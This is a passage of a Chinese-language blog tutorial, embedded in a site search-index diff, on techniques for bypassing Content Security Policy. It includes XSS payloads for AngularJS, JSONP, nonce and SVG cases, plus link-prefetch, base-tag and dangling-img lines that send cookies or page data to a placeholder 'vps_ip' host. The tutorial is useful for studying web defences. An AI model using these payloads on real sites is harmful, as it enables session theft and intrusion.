+<li>▲ 方法较老，不一定能成功实现，现在大部分浏览器的CSP开始约束这个标签</li>
+<li>利用条件<ul>
+<li>可以执行任意JS脚本，但是由于受到CSP影响无法外带数据</li>
+</ul>
+</li>
+<li>利用标签将数据外带</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----SCP的限制</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-scr &apos;self&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----写死的外带link标签</span><br><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&#125;&quot;&gt;</span><br><span class="line"></span><br><span class="line">----不写死的外带link标签</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;,&quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;,&quot;//vps_ip?&quot;+document.cookie);</span><br><span class="line">documnet.head.appendChild(link);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0X02-使用iframe绕过"><a href="#0X02-使用iframe绕过" class="headerlink" title="0X02 使用iframe绕过"></a>0X02 使用iframe绕过</h3><ul>
+<li>背景：当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</li>
+<li>利用条件<ul>
+<li>一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞（存在XSS漏洞原因是需要执行JS代码）</li>
+<li>我们需要的数据在存在CSP保护的页面</li>
+</ul>
+</li>
+<li>测试代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php  -&gt; A页面</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; script-src &apos;self&apos;&quot;&gt;</span><br><span class="line">&lt;h1 id=&quot;flag&quot;&gt;flag&#123;this_is_flag&#125;&lt;/h1&gt;</span><br><span class="line">---test1.www.xyz/3.php  -&gt; B页面</span><br><span class="line">//模拟XSS</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var iframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    iframe.src = &quot;1.php&quot;;</span><br><span class="line">    document.body.appenChild(iframe);</span><br><span class="line">    setTimeout(()=&gt;alert(iframe.contentView.document.getElementById(&apos;flag&apos;).innertHTML),1000)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/scp/iframe-alert.png" alt="iframe-alert"></p>
+<h3 id="OXO3-用CDN来绕过"><a href="#OXO3-用CDN来绕过" class="headerlink" title="OXO3 用CDN来绕过"></a>OXO3 用CDN来绕过</h3><ul>
+<li>背景<ul>
+<li>前端会用到许多的前端框架和库，引用到其他CDN上的JS框架</li>
+<li>CDN上如果存在一些低版本的框架，就可能存在绕过CSP的风险</li>
+</ul>
+</li>
+<li>利用条件<ul>
+<li>CDN服务商存在某些低版本的js库</li>
+<li>CDN服务商在CSP白名单中</li>
+<li>调用CDN服务商的js库</li>
+</ul>
+</li>
+<li>引用orange师傅采用了低版本的angular js模板注入来绕过CSP</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- foo=&quot;--&gt;</span><br><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果用了Jquery-mobile库，且CSP中包含<code>&quot;script-src &#39;unsafe-eval&#39;&quot;或者&quot;script-src &#39;strict-dynamic&#39;&quot;</code>，可以用此exp</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">低版本angular js的CDN服务商列表</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">库可以绕过CSP（来自blackhat2017）</a></li>
+</ul>
+<h3 id="0X04-站点可控静态资源绕过"><a href="#0X04-站点可控静态资源绕过" class="headerlink" title="0X04 站点可控静态资源绕过"></a>0X04 站点可控静态资源绕过</h3><ul>
+<li>▲ 感觉跟CDN来绕过的方式有点像，都是调用外部的库或者包，然后可以引用</li>
+<li>利用条件<ul>
+<li>站点存在可控静态资源</li>
+<li>站点在CSP白名单中</li>
+</ul>
+</li>
+<li>例子<ul>
+<li>如果前端的CSP中使用到了<a href="http://www.google-analytics.com" target="_blank" rel="noopener">www.google-analytics.com</a></li>
+<li>而<a href="http://www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP" target="_blank" rel="noopener">www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</a></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//访问www.google.analytics.com自定义js的功能，会得到一个id</span><br><span class="line">function test()&#123;</span><br><span class="line">    return alert(&quot;here&quot;)</span><br><span class="line">&#125;</span><br><span class="line">----test1.www.xyz/1.php（将获得的id填入下面的链接中的id即可）</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://www.google-analytics.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点</li>
+<li>▲ 2020.06.05 <a href="http://www.google.analytics.com暂无法进行访问" target="_blank" rel="noopener">www.google.analytics.com暂无法进行访问</a></li>
+</ul>
+<h3 id="0X05-站点可控JSONP绕过"><a href="#0X05-站点可控JSONP绕过" class="headerlink" title="0X05 站点可控JSONP绕过"></a>0X05 站点可控JSONP绕过</h3><ul>
+<li>前提：大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析</li>
+<li>利用条件<ul>
+<li>站点存在可控Jsonp</li>
+<li>站点在CSP白名单中</li>
+</ul>
+</li>
+<li>例子：Google站点存在了用户可控jsonp</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src https://www.google.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>▲ 配合注释，可以执行任意js</li>
+<li><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">一些存在用户可控资源或者jsonp比较常用站点的github项目</a></li>
+</ul>
+<h3 id="0X06-Base-uri绕过"><a href="#0X06-Base-uri绕过" class="headerlink" title="0X06 Base-uri绕过"></a>0X06 Base-uri绕过</h3><blockquote>
+<p>   无绝对路径的不完整资源</p>
+</blockquote>
+<ul>
+<li>当服务器CSP的script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径</li>
+<li>利用条件<ul>
+<li>CSP中的script-src只使用nonce</li>
+<li>没有额外设置base-uri</li>
+<li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li>
+</ul>
+</li>
+<li>测试代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip/&quot;&gt;</span><br><span class="line">&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0X07-不完整的script标签绕过nonce"><a href="#0X07-不完整的script标签绕过nonce" class="headerlink" title="0X07 不完整的script标签绕过nonce"></a>0X07 不完整的script标签绕过nonce</h3><ul>
+<li>利用条件<ul>
+<li>可控点在合法script标签上方,且其中没有其他标签</li>
+<li>XSS页面的CSP的script-src只采用了nonce方式</li>
+</ul>
+</li>
+<li>测试代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;nonce-xxxx&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;script nonce=&apos;xxxx&apos;&gt;</span><br><span class="line">    //do some thing</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>输入<code>http://test1.www.xyz/1.php?xss=&lt;script src=data:text/plain,alert(1)</code>，即造成xss</li>
+<li>解释：这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的<code>&lt;script</code>会变成一个属性，值为空，之后的nonce=’xxxxx’会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src</li>
+</ul>
+<p><img src="/images/sop_cors_csp/scp/nonce-example.png" alt="nonce-example"></p>
+<ul>
+<li>▲ 2020.06.05 本实验在Firefox上实验成功，在Chrome上不成功<ul>
+<li>即使构造特殊的url<code>http://test1.www.xyz/1.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code>，也无法成功，还是会受到CSP影响</li>
+<li>特殊的url解析：先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个<code>&lt;script</code>赋给了第二个a属性，浏览器在解析的时候直接忽略了第二个属性及其后面的值，这样Payload就能成功在chrome浏览器上执行</li>
+<li>标签的一个技巧：当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/sop_cors_csp/scp/nonce-chrome-error.png" alt="nonce-chrome-error"></p>
+<h3 id="0X08-SVG绕过"><a href="#0X08-SVG绕过" class="headerlink" title="0X08 SVG绕过"></a>0X08 SVG绕过</h3><ul>
+<li>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</li>
+<li>利用条件<ul>
+<li>可以上传svg图片</li>
+</ul>
+</li>
+<li>1.svg</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/scp/svg-example.png" alt="svg-example"></p>
+<h3 id="0X09-不完整的资源标签获取资源"><a href="#0X09-不完整的资源标签获取资源" class="headerlink" title="0X09 不完整的资源标签获取资源"></a>0X09 不完整的资源标签获取资源</h3><ul>
+<li>利用条件<ul>
+<li>可以加载外域资源（img-src: *）</li>
+<li>需要获取页面某处的信息</li>
+</ul>
+</li>
+<li>测试代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;;script-src &apos;self&apos;;img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;];?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class="line">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注解：这里可以注意到img用了*，有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的<code>&lt;img</code>标签来将数据带出</li>
+<li>浏览器访问：<code>http://127.0.0.1/2.php?xss=&lt;img src=&quot;//vps_ip?a=</code><ul>
+<li>此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/sop_cors_csp/scp/img-example.png" alt="img-example"></p>
+<ul>
+<li>▲ 2020.06.05 此实验在Chrome上无法成功执行，因为chrome不允许发出的url中含有回车或<code>&lt;</code>，否者不会发出</li>
+</ul>
+<p><img src="/images/sop_cors_csp/scp/img-chrome-error.png" alt="img-chrome-error"> </p>
+<h3 id="0X10-CRLF绕过"><a href="#0X10-CRLF绕过" class="headerlink" title="0X10 CRLF绕过"></a>0X10 CRLF绕过</h3><ul>
+<li>当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP</li>
+</ul>
+<h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a href="https://xz.aliyun.com/t/5084#toc-11" target="_blank" rel="noopener">我的CSP绕过思路及总结</a></li>
+<li><a href="http://sunu11.com/2019/12/13/learning-CSP/" target="_blank" rel="noopener">learning_CSP</a></li>
+<li><a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">A Wormable XSS on HackMD!</a></li>
 </ul>
 ]]></content>
-      <categories>
-        <category>Git</category>
-      </categories>
   </entry>
 </search>
